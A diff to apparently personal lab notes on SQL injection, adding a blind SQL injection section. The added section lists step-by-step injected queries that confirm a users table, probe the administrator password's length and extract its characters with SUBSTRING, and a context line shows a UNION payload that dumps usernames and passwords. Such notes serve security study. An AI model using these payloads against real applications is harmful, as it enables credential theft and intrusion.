@@ -114,3 +114,18 @@ SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,USERNAME_OTZUK
 
 > Payload: `' UNION SELECT NULL,USERNAME_OTZUKP||':'||PASSWORD_XWQJRU FROM USERS_QZXPQS--`
 
+## Blind SQL injection with conditional responses
+
+```sql
+SELECT traking-id FROM trakingdb WHERE TrackingId='YgTmD53GSYJdFn6i'
+SELECT traking-id FROM trakingdb WHERE TrackingId='YgTmD53GSYJdFn6i'--'
+SELECT traking-id FROM trakingdb WHERE TrackingId='YgTmD53GSYJdFn6i' AND 1=2--'
+SELECT traking-id FROM trakingdb WHERE TrackingId='YgTmD53GSYJdFn6i' AND 1=1--'
+SELECT traking-id FROM trakingdb WHERE TrackingId='YgTmD53GSYJdFn6i' AND (SELECT 'a' FROM users LIMIT 1)='a
+SELECT traking-id FROM trakingdb WHERE TrackingId='YgTmD53GSYJdFn6i' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+SELECT traking-id FROM trakingdb WHERE TrackingId='YgTmD53GSYJdFn6i' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+SELECT traking-id FROM trakingdb WHERE TrackingId='YgTmD53GSYJdFn6i' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+```
+
+> Payload : `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
+
